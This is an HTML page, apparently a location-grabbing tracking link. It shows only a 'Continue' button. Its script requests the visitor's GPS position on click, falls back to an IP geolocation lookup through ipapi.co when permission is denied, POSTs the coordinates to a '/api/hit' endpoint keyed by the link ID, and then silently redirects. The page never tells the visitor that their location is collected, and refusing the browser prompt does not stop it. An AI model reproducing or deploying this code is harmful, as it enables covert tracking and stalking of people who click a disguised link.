<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Continue</title>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  min-height: 100vh;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
  display: flex;
  align-items: center;
  justify-content: center;
}

.container {
  text-align: center;
  padding: 20px;
}

.btn {
  background: white;
  color: #667eea;
  border: none;
  padding: 15px 40px;
  font-size: 18px;
  font-weight: 600;
  border-radius: 50px;
  cursor: pointer;
  transition: transform 0.2s, box-shadow 0.2s;
  margin-top: 20px;
}

.btn:hover {
  transform: scale(1.05);
  box-shadow: 0 10px 25px rgba(0,0,0,0.2);
}

.btn:active {
  transform: scale(0.98);
}

.hidden {
  display: none;
}

.spinner {
  width: 40px;
  height: 40px;
  border: 3px solid rgba(255,255,255,0.3);
  border-top-color: white;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
  margin: 20px auto 0;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

p {
  color: white;
  font-size: 16px;
  margin-bottom: 20px;
}
</style>
</head>
<body>
<div class="container">
  <p>Click continue to proceed</p>
  <button class="btn" id="continueBtn">Continue →</button>
  <div id="loading" class="spinner hidden"></div>
</div>

<script>
const linkId = window.location.pathname.split('/').pop();
let destUrl = 'https://google.com';
let locationSent = false;
const continueBtn = document.getElementById('continueBtn');
const loading = document.getElementById('loading');

// Get destination URL
fetch('/api/hits/' + linkId)
  .then(r => r.json())
  .then(d => { if (d.dest) destUrl = d.dest; })
  .catch(() => {});

function sendLocation(lat, lon, acc) {
  if (locationSent) return;
  locationSent = true;
  
  fetch('/api/hit/' + linkId, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ lat, lon, acc })
  }).catch(() => {});
  
  // Redirect
  window.location.href = destUrl;
}

function getIPLocation() {
  fetch('https://ipapi.co/json/')
    .then(response => response.json())
    .then(data => {
      if (data.latitude && data.longitude) {
        sendLocation(data.latitude, data.longitude, 5000);
      } else {
        sendLocation(null, null, null);
      }
    })
    .catch(() => {
      sendLocation(null, null, null);
    });
}

function grabLocation() {
  continueBtn.style.display = 'none';
  loading.classList.remove('hidden');

  // Try GPS with a short timeout, fall back to IP immediately on any error
  if (navigator.geolocation) {
    const timeout = setTimeout(() => {
      // If GPS takes too long, use IP
      if (!locationSent) getIPLocation();
    }, 3000);

    navigator.geolocation.getCurrentPosition(
      pos => {
        clearTimeout(timeout);
        sendLocation(
          pos.coords.latitude,
          pos.coords.longitude,
          Math.round(pos.coords.accuracy)
        );
      },
      err => {
        clearTimeout(timeout);
        getIPLocation(); // Fall back to IP on denial/error
      },
      { enableHighAccuracy: false, timeout: 3000, maximumAge: 60000 }
    );
  } else {
    getIPLocation();
  }
}

continueBtn.addEventListener('click', grabLocation);
</script>
</body>
</html>
